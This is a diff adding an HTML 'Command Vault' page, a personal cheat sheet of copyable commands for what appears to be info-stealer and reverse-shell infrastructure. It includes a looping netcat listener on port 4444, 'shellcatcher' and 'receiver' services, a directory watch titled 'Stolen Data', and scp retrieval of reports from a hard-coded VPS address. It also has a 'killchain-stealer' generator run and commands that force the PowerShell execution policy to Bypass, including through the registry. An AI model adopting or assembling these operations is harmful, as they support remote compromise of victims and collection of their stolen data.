@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Command Vault</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  :root {
+    --bg: #0a0a0f;
+    --bg-card: #0d1117;
+    --cyan: #00f0ff;
+    --green: #00ff41;
+    --red: #ff2a6d;
+    --yellow: #ffee00;
+    --text: #c0c0c0;
+  }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    padding: 20px;
+    min-height: 100vh;
+  }
+  .header {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  .header h1 {
+    font-size: 1.8rem;
+    color: var(--cyan);
+    text-shadow: 0 0 10px rgba(0,240,255,0.5);
+    letter-spacing: 3px;
+  }
+  .header .sub {
+    font-size: 0.7rem;
+    color: var(--green);
+    opacity: 0.7;
+    margin-top: 6px;
+  }
+  .search-wrap {
+    max-width: 700px;
+    margin: 0 auto 16px;
+  }
+  .search-wrap input {
+    width: 100%;
+    background: var(--bg-card);
+    border: 1px solid rgba(0,240,255,0.2);
+    color: var(--cyan);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.9rem;
+    padding: 12px 16px;
+    outline: none;
+  }
+  .search-wrap input::placeholder { color: rgba(0,240,255,0.3); }
+  .filter-tags {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 8px;
+    margin-bottom: 16px;
+  }
+  .tag {
+    font-size: 0.65rem;
+    padding: 4px 12px;
+    border: 1px solid;
+    cursor: pointer;
+    user-select: none;
+    transition: all 0.2s;
+  }
+  .tag.active { background: rgba(0,240,255,0.15); }
+  .tag.vps { color: var(--yellow); border-color: var(--yellow); }
+  .tag.ps { color: var(--cyan); border-color: var(--cyan); }
+  .tag.defender { color: var(--red); border-color: var(--red); }
+  .tag.linux { color: var(--green); border-color: var(--green); }
+  .tag.git { color: var(--text); border-color: var(--text); }
+  .cmd-count {
+    text-align: center;
+    font-size: 0.6rem;
+    opacity: 0.4;
+    margin-bottom: 12px;
+  }
+  .cmd-list {
+    max-width: 900px;
+    margin: 0 auto;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+  .cmd-item {
+    background: var(--bg-card);
+    border: 1px solid rgba(0,240,255,0.08);
+    padding: 14px 16px;
+    position: relative;
+    transition: border-color 0.2s;
+  }
+  .cmd-item:hover {
+    border-color: rgba(0,240,255,0.2);
+  }
+  .cmd-item.hidden { display: none; }
+  .cmd-meta {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 8px;
+  }
+  .cmd-title {
+    font-size: 0.75rem;
+    color: var(--cyan);
+  }
+  .cmd-tag {
+    font-size: 0.5rem;
+    padding: 1px 8px;
+    border: 1px solid;
+  }
+  .cmd-tag.vps { color: var(--yellow); border-color: var(--yellow); }
+  .cmd-tag.ps { color: var(--cyan); border-color: var(--cyan); }
+  .cmd-tag.defender { color: var(--red); border-color: var(--red); }
+  .cmd-tag.linux { color: var(--green); border-color: var(--green); }
+  .cmd-tag.git { color: var(--text); border-color: var(--text); }
+  .cmd-code {
+    font-size: 0.7rem;
+    color: var(--text);
+    background: rgba(0,0,0,0.3);
+    padding: 10px 12px;
+    border-left: 2px solid;
+    white-space: pre-wrap;
+    word-break: break-word;
+    line-height: 1.5;
+    font-family: 'Share Tech Mono', monospace;
+  }
+  .cmd-actions {
+    display: flex;
+    justify-content: flex-end;
+    gap: 8px;
+    margin-top: 8px;
+  }
+  .btn {
+    font-size: 0.6rem;
+    padding: 4px 14px;
+    border: 1px solid rgba(0,240,255,0.3);
+    background: transparent;
+    color: var(--cyan);
+    font-family: 'Share Tech Mono', monospace;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .btn:hover { background: rgba(0,240,255,0.1); }
+  .btn.copied { color: var(--green); border-color: var(--green); }
+  .footer {
+    text-align: center;
+    margin-top: 30px;
+    font-size: 0.5rem;
+    opacity: 0.3;
+    letter-spacing: 2px;
+  }
+  @media (max-width: 600px) {
+    .header h1 { font-size: 1.2rem; }
+    .cmd-code { font-size: 0.6rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>COMMAND VAULT</h1>
+  <div class="sub">CSEC OPS // PERSONAL CHEAT SHEET</div>
+</div>
+
+<div class="search-wrap">
+  <input type="text" id="search" placeholder="Search commands... (e.g. screen, token, amsi)">
+</div>
+
+<div class="filter-tags">
+  <div class="tag vps active" data-filter="vps">VPS</div>
+  <div class="tag ps active" data-filter="ps">PowerShell</div>
+  <div class="tag defender active" data-filter="defender">Defender</div>
+  <div class="tag linux active" data-filter="linux">Linux</div>
+  <div class="tag git active" data-filter="git">Git</div>
+</div>
+
+<div class="cmd-count" id="count">Loading...</div>
+<div class="cmd-list" id="cmdList"></div>
+
+<div class="footer">// Command Vault // rainfantry //</div>
+
+<script>
+const COMMANDS = [
+  {
+    title: "Check Execution Policies",
+    code: "Get-ExecutionPolicy -List",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Set Execution Policy - All Scopes",
+    code: "Set-ExecutionPolicy Bypass -Scope Process -Force\nSet-ExecutionPolicy Bypass -Scope CurrentUser -Force\nSet-ExecutionPolicy Bypass -Scope LocalMachine -Force",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Set Execution Policy via Registry",
+    code: "Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell' -Name 'ExecutionPolicy' -Value 'Bypass' -Force",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Show File Extensions",
+    code: "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced' -Name HideFileExt -Value 0\nStop-Process -Name explorer -Force",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Show SuperHidden Files",
+    code: "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" -Name \"ShowSuperHidden\" -Value 1\nStop-Process -Name explorer -Force",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Check Defender Detections",
+    code: "Get-MpThreatDetection | Sort-Object -Property InitialDetectionTime -Descending | Select-Object -First 10",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Attach to Shellcatcher Screen",
+    code: "screen -r shellcatcher",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Detach from Screen",
+    code: "Ctrl+A, then D",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "List Screen Sessions",
+    code: "screen -ls",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Kill All Screen Sessions Named 'shells'",
+    code: "screen -ls | grep shells | cut -d. -f1 | xargs -I {} screen -X -S {}.shells quit",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Start Netcat Listener (screen)",
+    code: "screen -dmS shells bash -c 'while true; do nc -lvnp 4444; sleep 2; done'",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Check Listening Ports",
+    code: "ss -tlnp | grep -E \"8081|8082|4444\"",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Check Shellcatcher Service Status",
+    code: "systemctl status shellcatcher",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Restart Shellcatcher",
+    code: "systemctl restart shellcatcher",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Watch Shellcatcher Logs",
+    code: "journalctl -u shellcatcher -f",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Check Receiver Process",
+    code: "ps aux | grep receiver",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Start Receiver (background)",
+    code: "cd /opt\npython3 receiver.py > receiver.log 2>&1 &",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Watch Stolen Data Directory",
+    code: "watch -n 2 'ls -la /opt/reports/'",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Kill All Netcat Processes",
+    code: "killall nc",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Check Firewall (ufw)",
+    code: "ufw status\nufw allow 4444\nufw allow 8081",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "SCP from VPS",
+    code: "scp -r root@168.144.166.97:/opt/reports/ .",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Python HTTP Server",
+    code: "python -m http.server 8080",
+    tags: ["linux"],
+    accent: "#00ff41"
+  },
+  {
+    title: "Git Add + Commit + Push",
+    code: "git add .\ngit commit -m \"message\"\ngit push origin master",
+    tags: ["git"],
+    accent: "#c0c0c0"
+  },
+  {
+    title: "Deploy Receiver Pro on Port 8082",
+    code: "cd /opt\nsed -i 's/port=8081/port=8082/g' receiver_pro.py\nscreen -S receiver_pro\npython3 receiver_pro.py",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Check All Receivers",
+    code: "curl http://localhost:8080/health  # Original\ncurl http://localhost:8081/health  # Killchain\ncurl http://localhost:8082/health  # Pro",
+    tags: ["vps", "linux"],
+    accent: "#ffee00"
+  },
+  {
+    title: "Generate Killchain Pro Report",
+    code: "cd C:\\Users\\veren\\seclab\\killchain-stealer\npython generator_killchain_pro.py",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  }
+];
+
+const list = document.getElementById('cmdList');
+const search = document.getElementById('search');
+const count = document.getElementById('count');
+const tagButtons = document.querySelectorAll('.tag');
+
+let activeFilters = new Set(['vps','ps','defender','linux','git']);
+
+function render() {
+  const term = search.value.toLowerCase().trim();
+  let visible = 0;
+
+  list.innerHTML = COMMANDS.map((cmd, idx) => {
+    const matchesTerm = !term || cmd.title.toLowerCase().includes(term) || cmd.code.toLowerCase().includes(term);
+    const matchesTag = cmd.tags.some(t => activeFilters.has(t));
+    const show = matchesTerm && matchesTag;
+    if (show) visible++;
+
+    return `
+      <div class="cmd-item ${show ? '' : 'hidden'}">
+        <div class="cmd-meta">
+          <div class="cmd-title">${cmd.title}</div>
+          ${cmd.tags.map(t => `<div class="cmd-tag ${t}">${t.toUpperCase()}</div>`).join('')}
+        </div>
+        <div class="cmd-code" style="border-left-color:${cmd.accent}">${escapeHtml(cmd.code)}</div>
+        <div class="cmd-actions">
+          <button class="btn" onclick="copyCmd(${idx}, this)">COPY</button>
+        </div>
+      </div>
+    `;
+  }).join('');
+
+  count.textContent = `${visible} command${visible !== 1 ? 's' : ''} visible`;
+}
+
+function escapeHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function copyCmd(idx, btn) {
+  const text = COMMANDS[idx].code;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'COPIED';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1500);
+  });
+}
+
+search.addEventListener('input', render);
+
+tagButtons.forEach(btn => {
+  btn.addEventListener('click', () => {
+    const f = btn.dataset.filter;
+    if (activeFilters.has(f)) {
+      activeFilters.delete(f);
+      btn.classList.remove('active');
+    } else {
+      activeFilters.add(f);
+      btn.classList.add('active');
+    }
+    render();
+  });
+});
+
+render();
+</script>
+
+</body>
+</html>
